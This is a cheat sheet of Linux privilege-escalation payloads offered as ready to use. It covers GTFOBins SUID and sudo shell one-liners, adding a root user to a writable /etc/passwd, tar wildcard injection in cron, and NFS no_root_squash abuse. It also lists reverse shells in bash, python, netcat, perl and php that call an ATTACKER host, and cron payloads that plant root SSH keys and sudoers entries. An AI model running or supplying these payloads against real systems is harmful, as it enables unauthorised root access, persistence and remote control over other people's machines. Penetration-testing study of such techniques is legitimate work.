# 04 — Privilege Escalation: Payloads

> Ready-to-use payloads for privilege escalation scenarios.

> 📋 **What You Will Do In This Section**
> - [ ] Use SUID exploitation payloads for 10+ common binaries
> - [ ] Apply sudo payloads from GTFOBins
> - [ ] Add a root user via writable /etc/passwd
> - [ ] Exploit tar wildcard injection in cron jobs
> - [ ] Mount and exploit NFS shares with no_root_squash

---

## 🔴 SUID Exploitation Payloads

> 💡 **Why This Matters**
> Each of these is a one-liner that converts a SUID binary into a root shell. When you find a SUID binary in your scan, look it up here or on GTFOBins — the exploit is instant.

```bash
bash -p                                    # If bash has SUID
python -c 'import os; os.execl("/bin/sh","sh","-p")'
perl -e 'exec "/bin/sh";'
find . -exec /bin/sh -p \; -quit
vim -c ':!/bin/sh'
awk 'BEGIN {system("/bin/sh -p")}'
env /bin/sh -p
less /etc/passwd    → !sh
more /etc/passwd    → !sh
man man             → !sh
```

---

## 🔴 Sudo Payloads (From GTFOBins)

> 💡 **Why This Matters**
> Every line here is a tested command that gives you root if `sudo -l` shows NOPASSWD for that binary. Copy the `sudo -l` output, find the binary in this list, and run the matching command.

```bash
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo less /etc/shadow    # then type: !sh
sudo man man             # then type: !sh
sudo ftp                 # then type: !sh
sudo git help config     # then type: !sh
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh"
sudo zip /tmp/t.zip /tmp/t -T --unzip-command="sh -c /bin/sh"
sudo ssh -o ProxyCommand='sh -c "sh <&2 1>&2"' x
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
LFILE=/etc/shadow && sudo tee < "$LFILE"   # Read files via tee
```

#### 🧪 Try It Now — Sudo Payload Quick Reference

```bash
echo "=== Quick Reference: sudo -l → Payload ==="
echo ""
echo "If sudo -l shows:                    Run this:"
echo "──────────────────────────────────────────────────"
echo "NOPASSWD: /usr/bin/vim             → sudo vim -c ':!/bin/sh'"
echo "NOPASSWD: /usr/bin/find            → sudo find / -exec /bin/sh \\; -quit"
echo "NOPASSWD: /usr/bin/python3         → sudo python3 -c 'import os;os.system(\"/bin/sh\")'"
echo "NOPASSWD: /usr/bin/env             → sudo env /bin/sh"
echo "NOPASSWD: /usr/bin/less            → sudo less /etc/shadow → !sh"
echo "NOPASSWD: /usr/bin/awk             → sudo awk 'BEGIN {system(\"/bin/sh\")}'"
echo ""
echo "Full list: https://gtfobins.github.io/"
```

---

## 🔴 Writable /etc/passwd

> 💡 **Why This Matters**
> If `/etc/passwd` is writable (rare but devastating), you can add a user with UID 0 (root) in 10 seconds. This is the fastest possible privesc — no exploit needed, no tools needed.

```bash
# Step 1: Generate password hash
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$6luIRwdGpBvXdP.GMwcpF/

# Step 2: Add root-level user
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcpF/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Step 3: Login as root
su hacker
# Password: password123 → You are now root!
```

#### 🧪 Try It Now — Generate a Password Hash

```bash
# Practice generating hashes (safe — doesn't modify anything)
echo "=== Password Hash Generation ==="
openssl passwd -1 -salt test password123
echo ""
echo "Use this hash in: echo 'user:HASH:0:0::/root:/bin/bash' >> /etc/passwd"
```

> ✅ **Expected Output**
> ```
> $1$test$pi/xDtU5WFVRqYS6BMU8X/
> ```

---

## 🔴 Wildcard Injection (tar)

> 💡 **Why This Matters**
> If a cron job runs `tar czf backup.tar.gz *` in a directory you can write to, you can create filenames that `tar` interprets as command-line flags. This is a sneaky privesc vector that LinPEAS highlights.

```bash
# If cron runs: cd /target/dir && tar czf /tmp/backup.tar.gz *
# Create these files in /target/dir:

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# When tar runs with *, it expands to:
# tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2...
# tar treats the filenames as flags → executes shell.sh as root!

# After cron runs:
/tmp/rootbash -p  # Root!
```

---

## 🔴 NFS no_root_squash

> 💡 **Why This Matters**
> NFS shares with `no_root_squash` allow mounted users to create files as root. Mount the share from your attacker machine, create a SUID binary, then execute it on the target for instant root.

```bash
# On target — check for NFS shares
cat /etc/exports
# If you see: /shared_dir *(rw,no_root_squash) → exploitable!

# On attacker (as root):
mount -t nfs TARGET:/shared_dir /mnt
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash

# On target:
/shared_dir/rootbash -p  # Root!
```

---

## 🔴 Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e)
nc -e /bin/sh ATTACKER 4444

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🔴 Cron Job Payloads

```bash
# Create SUID shell
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /target/script.sh

# Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /target/script.sh

# Add SSH key
echo 'echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys' >> /target/script.sh

# Add sudo entry
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /target/script.sh
```

---

## 📋 Payload Selection Guide

| Scenario | Payload | Time to Root |
|----------|---------|-------------|
| SUID binary found | GTFOBins one-liner | 5 seconds |
| sudo NOPASSWD | GTFOBins one-liner | 5 seconds |
| Writable /etc/passwd | Add root user | 10 seconds |
| Writable cron script | Inject SUID copy | 1 minute (wait for cron) |
| tar wildcard cron | Create flag files | 1 minute (wait for cron) |
| NFS no_root_squash | Mount + SUID binary | 2 minutes |
| Kernel exploit | Compile + execute | 5-10 minutes |

---

## 🧠 If You're Stuck

1. **SUID shell drops privileges**: Always use `-p` flag with bash/sh to preserve SUID
2. **Cron payload not executing**: Check script permissions and cron syntax. Monitor with `pspy`.
3. **/etc/passwd not writable**: Try `/etc/shadow` or look for other writable critical files
4. **Wildcard injection not working**: File names must start with `--` exactly. Use `echo "" > "--checkpoint=1"` (quotes are essential)
